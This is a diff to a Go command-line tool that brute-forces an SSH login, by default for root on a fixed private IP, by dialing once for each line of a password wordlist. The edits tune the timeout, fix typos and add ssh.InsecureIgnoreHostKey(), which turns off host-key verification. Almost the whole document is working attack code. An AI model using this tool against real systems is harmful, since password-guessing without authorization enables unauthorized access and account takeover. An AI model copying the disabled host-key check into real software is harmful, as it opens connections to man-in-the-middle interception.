@@ -1,9 +1,4 @@
-/**
-* @Author: Aldo Sotolongo
-* @Date:   2016-06-20T14:12:18-04:30
-* @Email:  aldenso@gmail.com
-* @Last modified by:   Aldo Sotolongo
-* @Last modified time: 2016-06-20T15:26:13-04:30
+/*
 golang program to find a password for a ssh user using a large wordlist file.
 TODO: add args to check if the ip is down and create a results file.
 */
@@ -28,8 +23,8 @@ var (
 	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to brute force")
 	port         = flag.Int("port", 22, "indicate port to brute force")
 	user         = flag.String("user", "root", "indicate user to brute force")
-	// don't set timer to low, you may bypass the right password, for me it works with 150ms.
-	timer = flag.Duration("timer", 200*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
+	// don't set timer too low, you may bypass the right password, for me it works with 150ms, some other systems needs more than 300ms.
+	timer = flag.Duration("timer", 300*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
 )
 
 type resp struct {
@@ -67,11 +62,11 @@ func (f *fileScanner) GetScan() *bufio.Scanner {
 func sshdialer(password string) *resp {
 	salida := &resp{}
 	config := &ssh.ClientConfig{
-		User: *user,
-		Auth: []ssh.AuthMethod{
-			ssh.Password(password),
-		},
-		Timeout: *timer,
+
+		User:            *user,
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		Timeout:         *timer,
 	}
 	//Create dial
 	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
@@ -82,7 +77,7 @@ func sshdialer(password string) *resp {
 		d := end.Sub(inittime)
 		duration := d.Seconds()
 		fmt.Printf("\n+++ Pattern found: %s +++\n", password)
-		fmt.Printf("\nCompleted in %v senconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
+		fmt.Printf("\nCompleted in %v seconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
 	}
 	salida.Error = err
 	return salida
@@ -112,7 +107,7 @@ func main() {
 			resp := sshdialer(password)
 			resp.mu.Lock()
 			if resp.Error == nil {
-				fmt.Println("+++ FOUND IT +++")
+				fmt.Println("+++ FOUND +++")
 				fscanner.Close()
 				resp.mu.Unlock()
 				os.Exit(0)
